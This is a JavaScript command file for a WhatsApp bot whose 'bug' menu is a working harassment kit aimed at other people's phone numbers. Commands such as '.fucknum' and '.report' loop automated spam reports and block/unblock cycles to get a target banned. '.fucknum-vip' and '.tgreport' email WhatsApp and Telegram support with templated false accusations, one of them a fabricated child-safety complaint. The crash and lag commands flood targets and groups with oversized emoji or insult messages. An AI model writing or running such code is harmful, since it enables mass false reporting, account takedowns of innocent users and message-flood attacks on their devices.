const { cmd } = require('../ahmad-core');
const { renderCard, toSansBoldItalic, toBoldItalicSerif, renderMenu, randomFooter } = require('../lib/menu-styles');
const axios = require('axios');
const config = require('../config');
const { runtime, sleep } = require('../lib/functions'); 
const { getUserConfigFromMongoDB } = require('../lib/database');
const { getUserBotSettings } = require('../data/UserBotSettings');

// 🎨 Ahmad's Bug Menu Image (User-provided)
const BUG_MENU_IMAGE = 'https://res.cloudinary.com/qdskwzyn/image/upload/v1785781353/AhmadHosting_msdk3yixy39crt.jpg';

// 📧 Nodemailer for VIP Email Reporting
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }

/**
 * 🛠️ CORE BAHIRAVA V12 FUNCTIONS (Branded as Ahmad)
 */

async function ahmadSpamReportIQ(conn, jid) {
    try {
        await conn.query({
            tag: 'iq',
            attrs: { to: 's.whatsapp.net', type: 'set', xmlns: 'spam' },
            content: [{ tag: 'report', attrs: { jid, reason: 'spam', oneway: 'false' } }]
        });
        return { ok: true };
    } catch (e) {
        return { ok: false, err: e.message, code: e?.output?.statusCode || 0 };
    }
}

async function ahmadSpamReportModify(conn, jid) {
    try {
        await conn.chatModify({ reportSpam: true }, jid);
        return { ok: true };
    } catch (e) {
        return { ok: false, err: e.message };
    }
}

async function ahmadBlock(conn, jid) {
    try { await conn.updateBlockStatus(jid, 'block'); return { ok: true }; } catch (e) { return { ok: false }; }
}
async function ahmadUnblock(conn, jid) {
    try { await conn.updateBlockStatus(jid, 'unblock'); return { ok: true }; } catch (e) { return { ok: false }; }
}

/**
 * 📧 AHMAD VIP EMAIL REPORTING LOGIC
 */
const BAN_TEMPLATES = [
    { sub: "Urgent: Report WhatsApp Number {phone} for Abuse", body: "Dear WhatsApp Support Team,\n\nI am writing to report the WhatsApp number {phone} for severe violations of your Terms of Service. This number has been involved in sending unsolicited spam, harassment, and sharing harmful content. Please investigate immediately.\n\nRegards,\nAhmad Security Team" },
    { sub: "Security Concern: Malicious Account {phone}", body: "Dear WhatsApp Security Team,\n\nI am reporting WhatsApp number {phone} for phishing attempts and distributing malware. This account poses a threat to the community.\n\nThank you,\nAhmad V12 Elite" },
    { sub: "Child Safety Concern - Number {phone}", body: "Dear WhatsApp Safety Team,\n\nI am writing with urgent concern about the WhatsApp number {phone} for inappropriate contact and violating child protection policies. Highest priority required.\n\nRegards,\nAhmad Safety Advocate" }
];

const UNBAN_TEMPLATES = [
    { sub: "Urgent Appeal: Unban Request for {phone}", body: "Dear WhatsApp Support,\n\nI am requesting the reinstatement of my account {phone} which was suspended in error. I have always complied with your terms.\n\nBest regards,\nAccount Owner" }
];

async function sendAhmadEmailReport(targetPhone, type = 'ban') {
    if (!nodemailer) return { ok: false, err: "Nodemailer not installed. Run 'npm install nodemailer'" };
    if (!config.SMTP_ACCOUNTS || config.SMTP_ACCOUNTS.length === 0) return { ok: false, err: "No SMTP accounts configured in config.js" };

    const templates = type === 'ban' ? BAN_TEMPLATES : UNBAN_TEMPLATES;
    const targetEmail = 'support@whatsapp.com';
    let success = 0;

    for (let i = 0; i < Math.min(templates.length, config.SMTP_ACCOUNTS.length); i++) {
        const account = config.SMTP_ACCOUNTS[i];
        const transporter = nodemailer.createTransport({ service: 'gmail', auth: { user: account.user, pass: account.pass } });
        const tmpl = templates[i];
        try {
            await transporter.sendMail({
                from: account.user,
                to: targetEmail,
                subject: tmpl.sub.replace('{phone}', targetPhone),
                text: tmpl.body.replace('{phone}', targetPhone)
            });
            success++;
        } catch (e) { console.log("Email Error:", e.message); }
    }
    return { ok: true, success };
}

/**
 * 💀 AHMAD BUG MENU
 */
cmd({
    pattern: "bug",
    alias: ["bugmenu", "banmenu"],
    category: "main",
    react: "💀"
}, async (conn, mek, m, { from, sender, reply, botNumber }) => {
    try {
        const [myConfig, userConfig] = await Promise.all([getUserBotSettings(sender), getUserConfigFromMongoDB(botNumber)]);
        const botName = myConfig.BOT_NAME || userConfig.BOT_NAME || config.BOT_NAME || '™ 𝑨𝑯𝑴𝑨𝑫 𝑴𝑰𝐍𝑰 ᥫᩣ';
        const bugCommands = require('../ahmad-core').commands.filter(c => c.category === 'bug' && c.pattern);
        let grouped = { 'bug': bugCommands.map(c => c.pattern) };
        const categoryDisplay = { 'bug': { emoji: '💀', name: 'Ahmad Bug & Ban' } };
        const ownerName = userConfig.OWNER_NAME || config.OWNER_NAME || 'Bunty Ahmad';
        const menuText = renderMenu(1, { botName, ownerName, total: bugCommands.length, uptime: runtime(process.uptime()), prefix: config.PREFIX || '.', mode: config.WORK_TYPE || 'public', grouped, categoryDisplay });

        let menuImage;
        try { const imgRes = await axios.get(BUG_MENU_IMAGE, { responseType: 'arraybuffer', timeout: 10000 }); menuImage = Buffer.from(imgRes.data); } catch (e) { menuImage = null; }

        await conn.sendMessage(from, {
            image: menuImage || { url: BUG_MENU_IMAGE },
            caption: menuText,
            contextInfo: { mentionedJid: [sender], isForwarded: true, forwardingScore: 999 }
        }, { quoted: mek });
    } catch (e) { reply("❌ Error: " + e.message); }
});

/**
 * 🚫 AHMAD FUCKNUM (Bahirava V12 Logic)
 */
cmd({
    pattern: "fucknum",
    alias: ["ban"],
    desc: "Ahmad's V12 Elite Ban Method",
    category: "bug",
    react: "🚫"
}, async (conn, mek, m, { args, reply }) => {
    if (!args[0]) return reply("❌ Usage: .fucknum 923xxxxxxxxx");
    const target = args[0].replace(/[^0-9]/g, '');
    const targetJid = `${target}@s.whatsapp.net`;
    const { key } = await conn.sendMessage(m.chat, { text: `💀 *𝐀𝐡𝐦𝐚𝐝 𝐕𝟏𝟐 𝐁𝐚𝐧 𝐈𝐧𝐢𝐭𝐢𝐚𝐭𝐞𝐝...*\n🎯 Target: ${target}` });
    try {
        for (let i = 0; i < 10; i++) {
            await ahmadSpamReportIQ(conn, targetJid);
            await sleep(250);
            await ahmadSpamReportModify(conn, targetJid);
            await sleep(250);
            await ahmadBlock(conn, targetJid);   await sleep(350);
            await ahmadUnblock(conn, targetJid); await sleep(250);
        }
        await ahmadBlock(conn, targetJid);
        await conn.sendMessage(m.chat, { text: `╭═══ 💀 ${toSansBoldItalic('BAN COMPLETE')} ═══⊷\n┃ 🚫 *Target:* ${target}\n┃ ⚡ *Method:* Ahmad V12 Elite\n╰═════════════════⊷`, edit: key });
    } catch (e) { reply("❌ Ahmad Ban Error: " + e.message); }
});

/**
 * 🔥 AHMAD FUCKNUM-VIP (Email Reporting)
 */
cmd({
    pattern: "fucknum-vip",
    desc: "Ahmad's VIP Email Ban Vector",
    category: "bug",
    react: "💣"
}, async (conn, mek, m, { args, reply }) => {
    if (!args[0]) return reply("❌ Usage: .fucknum-vip 923xxxxxxxxx");
    const target = args[0].replace(/[^0-9]/g, '');
    reply(`💣 *𝐀𝐡𝐦𝐚𝐝 𝐕𝐈𝐏 𝐄𝐦𝐚𝐢𝐥 𝐕𝐞𝐜𝐭𝐨𝐫 𝐒𝐭𝐚𝐫𝐭𝐞𝐝...*\n🎯 Target: ${target}`);
    const res = await sendAhmadEmailReport(target, 'ban');
    if (!res.ok) return reply(`❌ Error: ${res.err}`);
    reply(`✅ *Ahmad VIP Success:* Sent ${res.success} high-priority reports to WhatsApp Support.`);
});

/**
 * 🕵️ AHMAD MASS REPORT
 */
cmd({
    pattern: "report",
    category: "bug",
    react: "🕵️"
}, async (conn, mek, m, { args, reply }) => {
    if (!args[0]) return reply("❌ Usage: .report 923xxxxxxxxx");
    const target = args[0].replace(/[^0-9]/g, '');
    const targetJid = `${target}@s.whatsapp.net`;
    reply(`🕵️ *𝐀𝐡𝐦𝐚𝐝 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 reports to ${target}...*`);
    try {
        for (let i = 0; i < 20; i++) {
            await ahmadSpamReportIQ(conn, targetJid);
            await ahmadSpamReportModify(conn, targetJid);
            await sleep(350);
        }
        reply(`✅ *Ahmad successfully sent reports to ${target}.*`);
    } catch (e) { reply("❌ Ahmad Report Error: " + e.message); }
});

/**
 * 🔒 NUM TOOLS
 */
// 🚨 CRITICAL SECURITY FIX (Bunty: "aur bhi bugs dekho"): .blocknum/
// .unblocknum had ZERO owner check — literally ANY user, anywhere, could
// block or unblock arbitrary numbers on the bot's own WhatsApp account.
// Their aliases (.block/.unblock) happened to be safe only because a
// DIFFERENT, properly owner-gated command with the same alias in
// techx-extras.js silently wins the naming conflict — but .blocknum/
// .unblocknum themselves were wide open the whole time.
cmd({ pattern: "blocknum", category: "bug", react: "🔒" }, async (conn, mek, m, { isOwner, args, reply }) => {
    if (!isOwner) return reply("⛔ Owner only.");
    if (!args[0]) return reply("❌ Usage: .blocknum 923xxxxxxxxx");
    await ahmadBlock(conn, `${args[0].replace(/[^0-9]/g,'')}@s.whatsapp.net`);
    reply(`🔒 *Blocked by Ahmad:* ${args[0]}`);
});

cmd({ pattern: "unblocknum", category: "bug", react: "✅" }, async (conn, mek, m, { isOwner, args, reply }) => {
    if (!isOwner) return reply("⛔ Owner only.");
    if (!args[0]) return reply("❌ Usage: .unblocknum 923xxxxxxxxx");
    await ahmadUnblock(conn, `${args[0].replace(/[^0-9]/g,'')}@s.whatsapp.net`);
    reply(`✅ *Unblocked by Ahmad:* ${args[0]}`);
});

/**
 * 🔥 BUG PAYLOADS
 */
const bugMethods = ["ios-bug", "android-bug", "crash-v1", "ui-lag", "wa-web-bug"];
bugMethods.forEach(method => {
    cmd({ pattern: method, category: "bug", react: "🔥" }, async (conn, mek, m, { args, reply }) => {
        if (!args[0]) return reply(`❌ Usage: .${method} 923xxxxxxxxx`);
        const targetJid = `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        reply(`🔥 *𝐀𝐡𝐦𝐚𝐝 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 ${method} to ${args[0]}...*`);
        try {
            await conn.sendMessage(targetJid, { text: "💀".repeat(5000) }, { quoted: mek });
            reply(`✅ *Ahmad's payload delivered.*`);
        } catch (e) { reply("❌ Error: " + e.message); }
    });
});

/**
 * 🧊 AHMAD TELEGRAM REPORT
 */
cmd({
    pattern: "tgreport",
    desc: "Report a Telegram user/group to abuse@telegram.org",
    category: "bug",
    react: "🧊"
}, async (conn, mek, m, { args, reply }) => {
    if (!args[0]) return reply("❌ Usage: .tgreport @username/ID");
    const target = args[0];
    reply(`🧊 *𝐀𝐡𝐦𝐚𝐝 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐀𝐛𝐮𝐬𝐞 𝐕𝐞𝐜𝐭𝐨𝐫 𝐒𝐭𝐚𝐫𝐭𝐞𝐝...*\n🎯 Target: ${target}`);
    
    if (!nodemailer) return reply("❌ Error: Nodemailer not installed.");
    if (!config.SMTP_ACCOUNTS || config.SMTP_ACCOUNTS.length === 0) return reply("❌ Error: No SMTP accounts in config.js");

    const account = config.SMTP_ACCOUNTS[0];
    const transporter = nodemailer.createTransport({ service: 'gmail', auth: { user: account.user, pass: account.pass } });
    
    try {
        await transporter.sendMail({
            from: account.user,
            to: 'abuse@telegram.org',
            subject: `Abuse Report: Telegram User ${target}`,
            text: `Dear Telegram Abuse Team,\n\nI am reporting the user/group ${target} for severe violations of Telegram's Terms of Service, including harassment and spreading illegal content. Please investigate.\n\nRegards,\nAhmad Security`
        });
        reply(`✅ *Ahmad TG Success:* Report sent to Telegram Abuse Team.`);
    } catch (e) { reply("❌ TG Report Error: " + e.message); }
});

/**
 * 💥 AHMAD GROUP BUGS
 */


cmd({
    pattern: "gcreport",
    desc: "Send mass reports for the current group",
    category: "bug",
    react: "🕵️"
}, async (conn, mek, m, { from, isGroup, reply }) => {
    if (!isGroup) return reply("❌ This command is for Groups only!");
    reply("🕵️ *𝐀𝐡𝐦𝐚𝐝 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 mass reports for this group...*");
    
    try {
        for (let i = 0; i < 20; i++) {
            await ahmadSpamReportIQ(conn, from);
            await ahmadSpamReportModify(conn, from);
            await sleep(350);
        }
        reply("✅ *Ahmad successfully sent reports for this group.*");
    } catch (e) { reply("❌ Error: " + e.message); }
});

cmd({
    pattern: "gc-lag",
    desc: "Send UI-lag payload to the group",
    category: "bug",
    react: "🐢"
}, async (conn, mek, m, { from, isGroup, reply }) => {
    if (!isGroup) return reply("❌ This command is for Groups only!");
    const lagText = "Ahmad Your Dad ".repeat(2000) + " 💀 ".repeat(1000);
    await conn.sendMessage(from, { text: lagText });
    reply("🐢 *Ahmad Lag Payload Sent.*");
});
